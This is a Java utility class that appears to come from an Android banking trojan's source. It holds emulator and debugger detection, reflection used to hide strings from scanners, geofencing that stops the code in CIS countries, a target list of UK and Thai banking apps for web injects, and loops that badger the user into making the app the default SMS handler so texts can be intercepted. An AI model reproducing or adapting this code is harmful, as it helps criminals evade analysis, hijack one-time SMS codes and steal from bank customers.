package com.moonny.helpers;

import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.moonny.Modules;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.processes.AndroidProcesses;
import com.moonny.processes.models.AndroidAppProcess;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import android.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Utils {

    private static final String TAG = "Utils";

    public static void threadSleep(long time)
    {
        try {
            Thread.sleep(time);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void minimizeAll(Context ctx)
    {
        Intent home = new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(home);
    }

//    public static String getTopActivityA4(ActivityManager am)
//    {
//        try {
//            List<ActivityManager.RunningTaskInfo> taskInfo = am.getRunningTasks(1);
//            ComponentName componentInfo = taskInfo.get(0).topActivity;
//            return componentInfo.getPackageName();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return "";
//    }

    // check if app in running foreground list
    public static boolean inRunningApps(String name, List<AndroidAppProcess> processes, Context ctx) {

        if(processes == null)
            processes = AndroidProcesses.getRunningForegroundApps(ctx);

        for(AndroidAppProcess p : processes) {
            if(p.getPackageName().equals(name))
                return true;
        }

        return false;
    }

    public static String aes_encrypt(String input, String key){

        if(input == null || input.isEmpty())
            return "";

//        Log.d(TAG, "UTILS AES encrypt: " + input + "; KEY: " + key);

        byte[] crypted = null;
        try{
            SecretKeySpec skey = new SecretKeySpec(key.getBytes(), S.AES);
            Cipher cipher = Cipher.getInstance(S.aes2);
            cipher.init(Cipher.ENCRYPT_MODE, skey);
            crypted = cipher.doFinal(input.getBytes());
        }catch(Exception e){
            if(Constant.DEBUG) {
                Log.d(TAG, "AES encrypt fail: " + e.toString());
                e.printStackTrace();
            }
            return input;
        }

        if(crypted == null)
            return input;

        return Base64.encodeToString(crypted, Base64.DEFAULT);
    }

    public static String aes_decrypt(String input, String key){

        if(input == null || input.isEmpty())
            return "";

//        Log.d(TAG, "UTILS AES decrypt: " + input + "; KEY: " + key);

        byte[] output = null;
        try{
            SecretKeySpec skey = new SecretKeySpec(key.getBytes(), S.AES);
            Cipher cipher = Cipher.getInstance(S.aes2);
            cipher.init(Cipher.DECRYPT_MODE, skey);

            output = cipher.doFinal(Base64.decode(input, Base64.DEFAULT));
        }catch(Exception e){
            if(Constant.DEBUG) {
                Log.d(TAG, "AES decrypt fail: " + e.toString() + "; DATA: " + input);
                e.printStackTrace();
            }
            return input;
        }

        if(output == null)
            return input;

        return new String(output);
    }

    public static boolean is_emulator(Context ctx)
    {
        String imei = IDUtility.getIMEI(ctx);

        if (Build.VERSION.RELEASE.equals("0")
                || imei.equals(S.bad_imei_1)
                || imei.equals(S.bad_imei_2)
                || imei.equals(S.bad_imei_3)
//                || Build.HARDWARE.contains(S.bad_golfdish)
  //              || Build.HARDWARE.contains(S.bad_ranchu)
                )
            return true;

        if(//Build.FINGERPRINT.startsWith(S.bad_fingerprint_generic)

    //                    ||Build.MANUFACTURER.equals(S.bad_unknown)
                        Build.MODEL.contains(S.bad_fingerprint_google_sdk)
                        ||Build.MODEL.contains(S.bad_fingerprint_emulator)
                        ||Build.MODEL.contains(S.bad_fingerprint_android_sdk)
                        ||Build.MANUFACTURER.contains(S.bad_fingerprint_genymotion))
            return true;

//        if(Build.BRAND.startsWith(S.bad_fingerprint_generic) && Build.DEVICE.startsWith(S.bad_fingerprint_generic))
  //          return true;

        if(S.bad_fingerprint_google_sdk.equals(Build.PRODUCT)
                || S.bad_fingerprint_sdk.equals(Build.PRODUCT)
                || S.bad_fingerprint_sdk_x86.equals(Build.PRODUCT)
                || S.bad_fingerprint_vbox86p.equals(Build.PRODUCT))
            return true;

        String carrier = IDUtility.getCarrier(ctx);

        for (String fakeCarrier: S.fake_carriers.split("\\|"))
            if (carrier.toLowerCase().equals(fakeCarrier))
                return true;

        return false;
    }

    private static boolean is_debugger()
    {
//        Debug.isDebuggerConnected()

        try {
            Method m = Class.forName(S.android + S.os + S.bad_debug).getDeclaredMethod(S.isDebuggerConnected1 + S.isDebuggerConnected2 + S.isDebuggerConnected3);
            return (boolean) m.invoke(null);
        }catch (Exception e){
            e.printStackTrace();
        }

        return false;
    }

    public static boolean is_blocked(Context ctx)
    {
        if (Constant.DEBUG) Log.d(TAG, "CHECK IF BLOCKED");
        
        if(Constant.DEBUG)
            return false;

        if(is_debugger()) {
            if (Constant.DEBUG) Log.d(TAG, "debugger detected; stop");
            return true;
        }

        if(is_emulator(ctx))
        {
            if (Constant.DEBUG) Log.d(TAG, "IMEI detected emulator; stop");
            return true;
        }

        if(Constant.SKIP_COUNTRY_CHECK)
            return false;

        String[] blocked_countries = S.blocked_countries.split("\\|");
        String[] blocked_langs = S.blocked_langs.split("\\|");

        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String iso = IDUtility.getCountry(telephonyManager).toLowerCase();

        //        if(iso.equals("ru") || iso.equals("rus") || iso.equals("kz") || iso.equals("ua") || iso.equals("by")
//                || iso.equals("az") || iso.equals("am") || iso.equals("kg") || iso.equals("md")
//                || iso.equals("tj") || iso.equals("tm") || iso.equals("uz") || iso.equals("us") || iso.equals("ca"))
        if(Arrays.asList(blocked_countries).contains(iso))
        {
            if(Constant.DEBUG) Log.d(TAG, "CIS detected in Network; stop");
            return true;
        }

        iso = IDUtility.getSimCountry(telephonyManager).toLowerCase();
        if(Arrays.asList(blocked_countries).contains(iso))
        {
            if(Constant.DEBUG) Log.d(TAG, "CIS detected in SIM; stop");
            return true;
        }

        // https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes
        // FUD from String locale = Locale.getDefault().getLanguage().toLowerCase();
        String locale = Locale.getDefault().getLanguage();//.toLowerCase();
        try{
            Method m = String.class.getDeclaredMethod(S.toLowerCase);
            locale = (String) m.invoke(locale);
        }catch (Exception e){
            if(Constant.DEBUG)
            {
                e.printStackTrace();
                Log.d("Utils", e.getMessage());
            }
        }

        if(Arrays.asList(blocked_langs).contains(locale))
        {
            if(Constant.DEBUG) Log.d(TAG, "Blocked by language "+locale+"; stop");
            return true;
        }

        return false;
    }

    public static String md5(final String s) {
        try {
            // Create MD5 Hash
            MessageDigest digest = MessageDigest
                    .getInstance(S.md5);
            digest.update(s.getBytes());
            byte messageDigest[] = digest.digest();

            // Create Hex String
            StringBuilder hexString = new StringBuilder();
            for (byte aMessageDigest : messageDigest) {
                String h = Integer.toHexString(0xFF & aMessageDigest);
                while (h.length() < 2)
                    h = "0" + h;
                hexString.append(h);
            }
            return hexString.toString();

        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return "";
    }

    public static String md5_file(String file_path) {

        FileInputStream is;
        try {
            is = new FileInputStream(file_path);
        }catch (FileNotFoundException e){
            e.printStackTrace();
            return null;
        }

        String md5 = "";
        char[] hexDigits = S.md5_abc.toCharArray();

        try {
            byte[] bytes = new byte[4096];
            int read;
            MessageDigest digest = MessageDigest.getInstance(S.md5);

            while ((read = is.read(bytes)) != -1) {
                digest.update(bytes, 0, read);
            }

            byte[] messageDigest = digest.digest();

            StringBuilder sb = new StringBuilder(32);

            for (byte b : messageDigest) {
                sb.append(hexDigits[(b >> 4) & 0x0f]);
                sb.append(hexDigits[b & 0x0f]);
            }

            //md5 = sb.toString();
            Method m = sb.getClass().getDeclaredMethod(S.toString);
            md5 = (String) m.invoke(sb);

        } catch (IOException | NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
//
        return md5;
    }

    // decode from base64
    public static String base64_to_string(String b64){
        String result = "";
        try {
            result = new String(Base64.decode(b64, Base64.DEFAULT));
        }
        catch (Exception e){
            if(Constant.DEBUG) e.printStackTrace();
        }

        return result;
    }

    // encode to base64
    public static String string_to_base64(String str)
    {
        String result = "";
        try {
            byte[] data64 = str.getBytes(S.utf8);
            result = Base64.encodeToString(data64, Base64.DEFAULT);
        }catch (Exception e)
        {
            if(Constant.DEBUG) e.printStackTrace();
        }

        return result;
    }

    public static boolean isUK(Context ctx)
    {
        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String iso = IDUtility.getCountry(telephonyManager).toLowerCase();
        String iso2 = IDUtility.getSimCountry(telephonyManager).toLowerCase();
        return iso.equals("gb") || iso2.equals("gb");
    }

    // // 27:uk.co.santander.santanderUK|28:uk.co.tsb.mobilebank|29:com.bbl.mobilebanking|30:com.kasikornbank.retail.kmerchant
    public static Map<String, Integer> getApplications(Context ctx, String apps) {

        String[] elems = (String[]) Modules.main(ctx, S.string2list, new Object[]{ apps });

        int sz = 0;
        for (String elem: elems) {
            if (elem.contains(":"))
                sz++;
        }

        Map<String, Integer> applications = new HashMap<>(sz);

        for (String elem: elems) {
            if(!elem.contains(":"))
                continue;

            String[] parts = elem.split(":");
            applications.put(parts[1], Integer.parseInt(parts[0]));
        }

        return applications;
    }

    // if app is a stopped webinject - true
//    public static boolean checkApplication(Context context, String appForCheck) {
//
//        String apps_stopped = (String) Modules.main(context, S.get_pref, new Object[]{ S.app_stop, "" });
//        return (boolean) Modules.main(context, S.list_has, new Object[]{apps_stopped, appForCheck});
//    }

    @TargetApi(19)
    public static boolean isSmsAdmin(Context ctx)
    {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.KITKAT) {
            return true;
        }
        
        String smsDef = Telephony.Sms.getDefaultSmsPackage(ctx);
        return (smsDef != null && smsDef.equals(ctx.getPackageName()));
    }

    public static void removeSmsAdmin(Context ctx) {

        String smsDef = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.sms_default_admin, "" }) /* Prefs-Manager.get(ctx, S.sms_default_admin, "") */;

        if(smsDef.isEmpty()) {
            if(Constant.DEBUG) Log.d(TAG, "default sms admin package is not defined");
            return;
        }

        while(isSmsAdmin(ctx)) {

            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, smsDef);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // only when start outside of mainActivity
            ctx.startActivity(intent);

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public static void getSmsAdmin(Context ctx) {

        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.KITKAT) {
            //Log.d("Tag", "You dont need to ask on versions lower 4.4");
            return;
        }

        String smsDef = Telephony.Sms.getDefaultSmsPackage(ctx);
        if(smsDef != null && smsDef.equals(ctx.getPackageName()))
        {
            if(Constant.DEBUG) Log.d(TAG, "already sms admin");
            return;
        }

        Modules.main(ctx, S.set_pref, new Object[]{ S.sms_default_admin, smsDef }) /* Prefs-Manager.set(ctx, S.sms_default_admin, smsDef) */;

        while(!isSmsAdmin(ctx)) {

            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, ctx.getPackageName());
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // only when start outside of mainActivity
            ctx.startActivity(intent);

            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        // enable sms intercept -- already should be enabled
        //PrefsManager.setSmsHook(ctx, true);

        // Constant cannot be saved permanently
//        List<String> MasLIST = Arrays.asList(Constant.APPS_MINIMIZE);
//        if(MasLIST.contains(smsDef))
//        {
//            Log.d(TAG, "sms default already in block list");
//            return;
//        }
//
//        // add default sms manager to block list
//        ArrayList<String> list2 = new ArrayList<String>();
//        list2.addAll(MasLIST);
//        list2.add(smsDef); // com.android.mms
//
//        String[] result = new String[list2.size()];
//        Constant.APPS_MINIMIZE = list2.toArray(result);
    }
}
